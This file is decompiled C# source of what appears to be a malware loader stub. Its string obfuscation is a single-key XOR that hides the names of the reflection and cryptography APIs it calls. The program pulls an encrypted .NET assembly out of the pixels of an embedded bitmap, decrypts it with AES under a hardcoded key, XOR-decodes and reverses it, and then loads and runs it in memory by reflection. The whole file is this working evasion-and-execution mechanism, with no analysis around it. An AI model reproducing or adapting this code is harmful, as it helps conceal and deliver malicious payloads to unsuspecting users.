using System;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Threading;

namespace NS;

internal static class Program
{
	private static string RmaYRKlHTyivUoBlgt(byte[] s)
	{
		byte[] array = Decode(s);
		char[] array2 = new char[array.Length];
		for (int i = 0; i < array2.Length; i++)
		{
			array2[i] = (char)array[i];
		}
		return new string(array2);
	}

	private static RijndaelManaged GetRM()
	{
		Type type = Type.GetType(RmaYRKlHTyivUoBlgt(new byte[44]
		{
			149, 191, 181, 178, 163, 171, 232, 149, 163, 165,
			179, 180, 175, 178, 191, 232, 133, 180, 191, 182,
			178, 169, 161, 180, 167, 182, 174, 191, 232, 148,
			175, 172, 168, 162, 167, 163, 170, 139, 167, 168,
			167, 161, 163, 162
		}));
		ConstructorInfo constructor = type.GetConstructor(new Type[0]);
		return (RijndaelManaged)constructor.Invoke(BindingFlags.CreateInstance, null, null, null);
	}

	private static byte[] Decode(byte[] data)
	{
		byte[] key = GetKey();
		for (int i = 0; i < data.Length; i++)
		{
			for (int j = 0; j < key.Length; j++)
			{
				data[i] = (byte)(data[i] ^ key[j]);
			}
		}
		return data;
	}

	private static Type GetAT(Assembly a)
	{
		Type type = Type.GetType(RmaYRKlHTyivUoBlgt(new byte[26]
		{
			149, 191, 181, 178, 163, 171, 232, 148, 163, 160,
			170, 163, 165, 178, 175, 169, 168, 232, 135, 181,
			181, 163, 171, 164, 170, 191
		}));
		MethodInfo[] methods = type.GetMethods();
		int num = 0;
		MethodInfo methodInfo;
		while (true)
		{
			if (num < methods.Length)
			{
				methodInfo = methods[num];
				if (methodInfo.Name == RmaYRKlHTyivUoBlgt(new byte[7] { 129, 163, 178, 146, 191, 182, 163 }) && methodInfo.GetParameters().Length == 1)
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return (Type)methodInfo.Invoke(a, new object[1] { RmaYRKlHTyivUoBlgt(new byte[15]
		{
			150, 180, 169, 161, 180, 167, 171, 232, 150, 180,
			169, 161, 180, 167, 171
		}) });
	}

	private static void DoInvoke(MethodInfo m, string[] args)
	{
		m.Invoke(null, GetArgs(args));
	}

	private static byte[] GetBytesFromImage(Bitmap bmp)
	{
		byte[] array = new byte[1077264];
		int num = 0;
		for (int i = 0; i < ((Image)bmp).get_Width(); i++)
		{
			if (num == array.Length)
			{
				break;
			}
			for (int j = 0; j < ((Image)bmp).get_Height(); j++)
			{
				if (num == array.Length)
				{
					break;
				}
				Color pixel = bmp.GetPixel(j, i);
				for (int k = 0; k < 4; k++)
				{
					if (num == array.Length)
					{
						break;
					}
					switch (k)
					{
					case 0:
						array[num++] = pixel.A;
						break;
					case 1:
						array[num++] = pixel.R;
						break;
					case 2:
						array[num++] = pixel.G;
						break;
					case 3:
						array[num++] = pixel.B;
						break;
					}
				}
			}
		}
		return array;
	}

	private static void Main(string[] args)
	{
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		Thread.Sleep(0);
		ResourceManager resourceManager = new ResourceManager(RmaYRKlHTyivUoBlgt(new byte[2] { 181, 143 }), typeof(Program).Assembly);
		Bitmap bmp = (Bitmap)resourceManager.GetObject(RmaYRKlHTyivUoBlgt(new byte[14]
		{
			135, 190, 140, 130, 175, 160, 163, 156, 173, 138,
			130, 150, 143, 130
		}));
		byte[] bytesFromImage = GetBytesFromImage(bmp);
		RijndaelManaged rM = GetRM();
		rM.Key = GetKey();
		bytesFromImage = rM.CreateDecryptor().TransformFinalBlock(bytesFromImage, 0, bytesFromImage.Length);
		bytesFromImage = Decode(bytesFromImage);
		RevArray(bytesFromImage);
		Assembly a = LoadAssembly(bytesFromImage);
		Type aT = GetAT(a);
		MethodInfo m = aT.GetMethods()[0];
		DoInvoke(m, args);
	}

	private static byte[] GetKey()
	{
		return new byte[24]
		{
			160, 58, 116, 142, 80, 176, 108, 5, 18, 41,
			4, 213, 49, 205, 113, 153, 243, 74, 74, 159,
			49, 114, 231, 25
		};
	}

	private static Assembly LoadAssembly(byte[] data)
	{
		MethodInfo[] methods = Type.GetType(RmaYRKlHTyivUoBlgt(new byte[26]
		{
			149, 191, 181, 178, 163, 171, 232, 148, 163, 160,
			170, 163, 165, 178, 175, 169, 168, 232, 135, 181,
			181, 163, 171, 164, 170, 191
		}))!.GetMethods();
		int num = 0;
		MethodInfo methodInfo;
		while (true)
		{
			if (num < methods.Length)
			{
				methodInfo = methods[num];
				if (methodInfo.Name == RmaYRKlHTyivUoBlgt(new byte[4] { 138, 169, 167, 162 }) && methodInfo.GetParameters().Length == 1 && (object)methodInfo.GetParameters()[0].ParameterType == typeof(byte[]))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return (Assembly)methodInfo.Invoke(null, new object[1] { data });
	}

	private static void RevArray(byte[] data)
	{
		MethodInfo[] methods = Type.GetType(RmaYRKlHTyivUoBlgt(new byte[12]
		{
			149, 191, 181, 178, 163, 171, 232, 135, 180, 180,
			167, 191
		}))!.GetMethods();
		foreach (MethodInfo methodInfo in methods)
		{
			if (methodInfo.Name == RmaYRKlHTyivUoBlgt(new byte[7] { 148, 163, 176, 163, 180, 181, 163 }) && methodInfo.GetParameters().Length == 1)
			{
				methodInfo.Invoke(null, new object[1] { data });
			}
		}
	}

	private static object[] GetArgs(string[] args)
	{
		return new object[1] { args };
	}
}
